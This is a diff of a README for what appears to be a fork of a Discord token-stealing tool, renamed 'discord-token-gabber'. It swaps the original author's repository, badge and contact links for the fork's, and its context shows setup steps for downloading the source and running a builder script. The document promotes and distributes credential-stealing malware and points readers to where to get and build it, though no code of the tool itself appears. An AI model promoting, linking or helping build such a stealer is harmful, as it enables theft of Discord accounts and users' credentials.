@@ -1,16 +1,16 @@
 <img src="img/banner.png" width="100%" height="100%" />
 
 <div align="center">
-    <img src="https://img.shields.io/github/languages/top/addi00000/empyrean?color=%23000000">
-    <img src="https://img.shields.io/github/stars/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/languages/top/qrlmza/discord-token-gabber?color=%23000000">
+    <img src="https://img.shields.io/github/stars/qrlmza/discord-token-gabber?color=%23000000&logoColor=%23000000">
     <br>
-    <img src="https://img.shields.io/github/commit-activity/w/addi00000/empyrean?color=%23000000"> 
-    <img src="https://img.shields.io/github/last-commit/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/commit-activity/w/qrlmza/discord-token-gabber?color=%23000000"> 
+    <img src="https://img.shields.io/github/last-commit/qrlmza/discord-token-gabber?color=%23000000&logoColor=%23000000">
     <br>
-    <img src="https://img.shields.io/github/issues/addi00000/empyrean?color=%23000000&logoColor=%23000000">
-    <img src="https://img.shields.io/github/issues-closed/addi00000/empyrean?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/issues/qrlmza/discord-token-gabber?color=%23000000&logoColor=%23000000">
+    <img src="https://img.shields.io/github/issues-closed/qrlmza/discord-token-gabber?color=%23000000&logoColor=%23000000">
     <br>
-    Due to constant Discord terminations I will not be making a new support server. For urgent contact: <a href="https://t.me/forrrrrrrrr">Telegram</a>
+    For contact: <a href="https://discord.leblondel-nathanael.yn.lu/">Discord</a>
 </div>
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
@@ -59,7 +59,7 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
+1. [Download source code zip](https://github.com/qrlmza/discord-token-gabber/archive/refs/heads/main.zip)
 2. Extract zip
 3. Run `install_python.bat` if you don't have python installed
 4. Run the builder by double clicking the `build.bat` file
@@ -84,7 +84,7 @@ Empyrean is licensed under the <a href="https://mit-license.org/">MIT License</a
 
 ## Errors?
 
--   Make an [issue](https://github.com/addi00000/empyrean/issues)
--   Join the [Discord](https://discord.gg/GudVbfd9ZU)
+-   Make an [issue](https://github.com/qrlmza/discord-token-gabber/issues)
+-   Join the [Discord](https://discord.leblondel-nathanael.yn.lu)
 
 <img src="img/footer.png">
